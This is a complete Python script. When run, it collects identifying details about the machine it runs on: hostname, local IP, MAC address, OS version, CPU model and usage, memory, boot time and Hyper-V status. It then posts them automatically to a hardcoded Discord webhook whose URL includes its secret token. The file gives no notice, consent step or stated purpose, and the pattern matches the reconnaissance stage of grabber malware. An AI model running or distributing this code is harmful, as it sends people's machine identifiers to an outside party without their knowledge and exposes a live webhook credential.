import platform
import socket
import cpuinfo
import psutil
import datetime
import re
import uuid
from discord_webhook import DiscordWebhook


# Function to send message chunks to Discord webhook
def send_to_discord_webhook(content):
    webhook_url = "https://discord.com/api/webhooks/1114992674987069461/wV-1u2U4TRBlKBWVqaL5vAONNLW1zrrh87r7j479R96Az3rlqwGKB5VKRUXfNNhrL71U"
    webhook = DiscordWebhook(url=webhook_url, content=content)
    webhook.execute()


# Function to split the message into chunks and send them
def send_message_chunks(message, chunk_size=2000):
    chunks = [
        message[i:i + chunk_size] for i in range(0, len(message), chunk_size)
    ]
    for chunk in chunks:
        send_to_discord_webhook(chunk)


# Function to format bytes to a proper format
def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


# Function to format and send system information
def system_information(spaces=12):
    content = "```"
    content += "\nSystem Information:\n\n"
    uname = platform.uname()
    content += "{0:<{spaces}} {1:>20}\n".format("System:",
                                                uname.system,
                                                spaces=spaces)
    content += "{0:<{spaces}} {1:>20}\n".format("Node Name:",
                                                uname.node,
                                                spaces=spaces)
    content += "{0:<{spaces}} {1:>20}\n".format("Release:",
                                                uname.release,
                                                spaces=spaces)
    content += "{0:<{spaces}} {1:>20}\n".format("Version:",
                                                uname.version,
                                                spaces=spaces)
    content += "{0:<{spaces}} {1:>20}\n".format("Machine:",
                                                uname.machine,
                                                spaces=spaces)
    content += "{0:<{spaces}} {1:>20}\n".format("Processor:",
                                                uname.processor,
                                                spaces=spaces)
    content += "{0:<{spaces}} {1:>20}\n".format(
        "Processor:", cpuinfo.get_cpu_info()['brand_raw'], spaces=spaces)
    content += "{0:<{spaces}} {1:>20}\n".format("IP Address:",
                                                socket.gethostbyname(
                                                    socket.gethostname()),
                                                spaces=spaces)
    content += "{0:<{spaces}} {1:>20}\n".format(
        "Mac Address:",
        ':'.join(re.findall('..', '%012x' % uuid.getnode())),
        spaces=spaces)

    # Boot Time
    content += "\nBoot Time:\n"
    boot_time_timestamp = psutil.boot_time()
    bt = datetime.datetime.fromtimestamp(boot_time_timestamp)
    content += "{0:<{spaces}} {1:>20}\n".format(
        "Boot Time:",
        f"{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}",
        spaces=spaces)

    # CPU information
    content += "\nCPU Info:\n"
    content += "{0:<{spaces}} {1:>20}\n".format(
        "Physical cores:", psutil.cpu_count(logical=False), spaces=spaces)
    content += "{0:<{spaces}} {1:>20}\n".format("Total cores:",
                                                psutil.cpu_count(logical=True),
                                                spaces=spaces)
    cpufreq = psutil.cpu_freq()
    content += "{0:<{spaces}} {1:>20.2f}Mhz\n".format("Max Frequency:",
                                                      cpufreq.max,
                                                      spaces=spaces)
    content += "{0:<{spaces}} {1:>20.2f}Mhz\n".format("Min Frequency:",
                                                      cpufreq.min,
                                                      spaces=spaces)
    content += "{0:<{spaces}} {1:>20.2f}Mhz\n".format("Current Frequency:",
                                                      cpufreq.current,
                                                      spaces=spaces)
    content += "\nCPU Usage Per Core:\n"
    for i, percentage in enumerate(psutil.cpu_percent(percpu=True,
                                                      interval=1)):
        content += "{0:<{spaces}} {1:>20.1f}%\n".format(f"Core {i}:",
                                                        percentage,
                                                        spaces=spaces)
    content += "{0:<{spaces}} {1:>20.1f}%\n".format("Total CPU Usage:",
                                                    psutil.cpu_percent(),
                                                    spaces=spaces)

    # Memory Information
    content += "\nMemory Information:\n"
    svmem = psutil.virtual_memory()
    content += "{0:<{spaces}} {1:>20}\n".format("Total Memory:",
                                                get_size(svmem.total),
                                                spaces=spaces)
    content += "{0:<{spaces}} {1:>20}\n".format("Available Memory:",
                                                get_size(svmem.available),
                                                spaces=spaces)
    content += "{0:<{spaces}} {1:>20}\n".format("Used Memory:",
                                                get_size(svmem.used),
                                                spaces=spaces)

    content += "```"
    send_message_chunks(content)


# Function to check Hyper-V status
def check_hyper_v():
    if platform.system() == 'Windows':
        try:
            import wmi
            c = wmi.WMI()
            hyperv = c.Win32_ComputerSystem()[0].HypervisorPresent
            if hyperv:
                return "`Hyper-V is enabled.`"
            else:
                return "`Hyper-V is disabled.`"
        except Exception as e:
            return "`Failed to retrieve Hyper-V status.`"
    else:
        return "`Hyper-V is only available on Windows.`"


# Call the system_information function
system_information(12)

# Call the check_hyper_v function
hyper_v_status = check_hyper_v()
send_to_discord_webhook(hyper_v_status)
